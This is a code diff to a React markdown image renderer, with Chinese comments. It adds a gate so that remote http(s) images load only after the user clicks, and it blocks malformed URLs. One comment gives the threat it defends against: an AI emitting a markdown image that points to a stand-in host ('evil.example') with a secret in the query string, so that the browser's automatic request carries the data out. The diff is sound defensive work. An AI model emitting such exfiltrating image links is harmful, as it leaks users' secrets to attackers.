@@ -22,13 +22,26 @@ import {
   useEffect,
   useRef,
   useState,
+  useSyncExternalStore,
   type ReactNode,
 } from "react";
-import { ChevronLeft, ChevronRight, X } from "lucide-react";
+import { ChevronLeft, ChevronRight, ImageDown, X } from "lucide-react";
 
 import { Tooltip } from "@/components/ui/tooltip";
 import { useTitleBarOverlayDim } from "@/hooks/use-titlebar-overlay-dim";
 import { toLoadableImageSrc } from "@/lib/local-image-src";
+import {
+  blockedImageText,
+  classifyLoadableImageSrc,
+  displayImageAlt,
+  isRemoteImageLoaded,
+  markRemoteImageLoaded,
+  remoteImageAriaLabel,
+  remoteImageButtonText,
+  remoteImageInlineText,
+  subscribeRemoteImageLoaded,
+  type ImageSrcGate,
+} from "@/lib/remote-image-gate";
 import { isUncLikePath } from "@/lib/unc-path";
 import { cn } from "@/lib/utils";
 
@@ -306,33 +319,22 @@ export const ImageThumb = ({
 };
 
 /**
- * markdown 正文里的图片（`![alt](src)`）统一渲染器——给 ReactMarkdown / Streamdown 的 `components={{ img }}`。
- *
- * markdown 图按自然尺寸内联展示（不是固定缩略图）、但同样点击进 lightbox 看大图。
- * 所有 Streamdown 实例都要配上 a+img（+ rehypeRewriteLocalImages）；本地路径转换见
- * `@/lib/local-image-src`（AST 层 sanitize 前也会改写，防 file:// 被剥掉）。
+ * 已确认可以加载的 markdown 图的渲染树（**纯函数、不含 hook**——MarkdownImage 与 RemoteMarkdownImage 共用，
+ * 调用方各自取好 `open` / `insideInteractive` 传进来；tests/b64-review-gaps 靠「直接调函数体就能展开元素树」驱动它）。
  */
-export const MarkdownImage = ({
-  src,
+const renderLoadedMarkdownImage = ({
+  url,
   alt,
   title,
+  open,
+  insideInteractive,
 }: {
-  src?: string | Blob;
+  url: string;
   alt?: string;
   title?: string;
+  open: ImagePreviewContextValue["open"];
+  insideInteractive: boolean;
 }) => {
-  const { open } = useImagePreview();
-  const insideInteractive = useContext(InsideInteractiveContext);
-  // src 可能是 string（url / dataUrl）；react-markdown 类型上带 Blob、运行时基本是 string
-  const url = typeof src === "string" ? toLoadableImageSrc(src) : "";
-  if (!url) {
-    // UNC 形态是被安全守卫有意挡掉的（见 lib/unc-path）：别静默吞成空白，给个看得见的占位（R12-03），
-    // 与 BlockedMarkdownImage 同款朴素文案
-    if (typeof src === "string" && isUncLikePath(src)) {
-      return <span className="text-muted-foreground">[图片：网络路径不支持预览]</span>;
-    }
-    return null;
-  }
   if (insideInteractive) {
     // 外层已是链接 / 按钮：保持改前的写法（img 自己带 onClick），不再套 button
     return (
@@ -368,4 +370,97 @@ export const MarkdownImage = ({
       </button>
     </Tooltip>
   );
+};
+
+/**
+ * 远程（http / https）markdown 图：**默认只渲染占位，不渲染 `<img>`、不发任何请求**；用户点了才加载。
+ *
+ * 防的是「AI 输出 `![](https://evil.example/p?d=<密钥>)`、渲染时浏览器自动请求、把数据带出去」（见 lib/remote-image-gate）。
+ * 占位里没有该 URL 的 src / srcset / background-image；URL 只存在于 gate.key（内存里）和用户点击之后的 `<img src>`。
+ * 流式输出中的半截 URL 同理：占位不发请求，点之前什么都不会发生。
+ *
+ * 「已加载」存模块级 Set（useSyncExternalStore 订阅）：虚拟列表重新挂载这一行时不会又变回占位，
+ * 同一 URL 的多个占位点一个全部翻成图。
+ *
+ * 外层已是链接 / 按钮（`[![alt](远程图)](href)`）时：只给文本占位、不给加载按钮——
+ * 按钮套 a 是无效 HTML，且这一下点击本来就该是跳转。要看图就点链接。
+ */
+const RemoteMarkdownImage = ({
+  gate,
+  alt,
+  title,
+}: {
+  gate: Extract<ImageSrcGate, { kind: "remote" }>;
+  alt?: string;
+  title?: string;
+}) => {
+  const { open } = useImagePreview();
+  const insideInteractive = useContext(InsideInteractiveContext);
+  const loaded = useSyncExternalStore(
+    subscribeRemoteImageLoaded,
+    () => isRemoteImageLoaded(gate.key),
+    () => isRemoteImageLoaded(gate.key),
+  );
+  if (loaded) {
+    // 渲染规范化后的 URL（与 gate.key 同一个）：判定的和浏览器会请求的是同一个地址
+    return renderLoadedMarkdownImage({ url: gate.key, alt, title, open, insideInteractive });
+  }
+  if (insideInteractive) {
+    return <span className="text-muted-foreground">{remoteImageInlineText(gate.host, alt)}</span>;
+  }
+  const altText = displayImageAlt(alt);
+  return (
+    <button
+      type="button"
+      onClick={() => markRemoteImageLoaded(gate.key)}
+      aria-label={remoteImageAriaLabel(gate.host, alt)}
+      className="my-1 inline-flex max-w-full items-center gap-1.5 rounded-md border border-dashed bg-muted/30 px-2.5 py-1.5 text-left text-xs text-muted-foreground transition-colors hover:bg-muted hover:text-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
+    >
+      <ImageDown className="size-3.5 shrink-0" aria-hidden />
+      <span className="shrink-0">{remoteImageButtonText(gate.host)}</span>
+      {altText && <span className="min-w-0 truncate">{altText}</span>}
+    </button>
+  );
+};
+
+/**
+ * markdown 正文里的图片（`![alt](src)`）统一渲染器——给 ReactMarkdown / Streamdown 的 `components={{ img }}`。
+ *
+ * markdown 图按自然尺寸内联展示（不是固定缩略图）、但同样点击进 lightbox 看大图。
+ * 所有 Streamdown 实例都要配上 a+img（+ rehypeRewriteLocalImages）；本地路径转换见
+ * `@/lib/local-image-src`（AST 层 sanitize 前也会改写，防 file:// 被剥掉）。
+ *
+ * 前端安全硬化：远程 http(s) 图**默认不加载、点击才加载**（{@link RemoteMarkdownImage}），
+ * 畸形 / 不安全 URL 不渲染图片（只给文本占位）；data: / blob: / 站内路径（含 /api/local-image）照旧。
+ * 判定在 `@/lib/remote-image-gate`。artifact-panel / 修订视图（baseComponents）与 MarkdownText 共用这一个入口。
+ */
+export const MarkdownImage = ({
+  src,
+  alt,
+  title,
+}: {
+  src?: string | Blob;
+  alt?: string;
+  title?: string;
+}) => {
+  const { open } = useImagePreview();
+  const insideInteractive = useContext(InsideInteractiveContext);
+  // src 可能是 string（url / dataUrl）；react-markdown 类型上带 Blob、运行时基本是 string
+  const url = typeof src === "string" ? toLoadableImageSrc(src) : "";
+  if (!url) {
+    // UNC 形态是被安全守卫有意挡掉的（见 lib/unc-path）：别静默吞成空白，给个看得见的占位（R12-03），
+    // 与 BlockedMarkdownImage 同款朴素文案
+    if (typeof src === "string" && isUncLikePath(src)) {
+      return <span className="text-muted-foreground">[图片：网络路径不支持预览]</span>;
+    }
+    return null;
+  }
+  const gate = classifyLoadableImageSrc(url);
+  if (gate.kind === "blocked") {
+    return <span className="text-muted-foreground">{blockedImageText(alt)}</span>;
+  }
+  if (gate.kind === "remote") {
+    return <RemoteMarkdownImage gate={gate} alt={alt} title={title} />;
+  }
+  return renderLoadedMarkdownImage({ url: gate.src, alt, title, open, insideInteractive });
 };
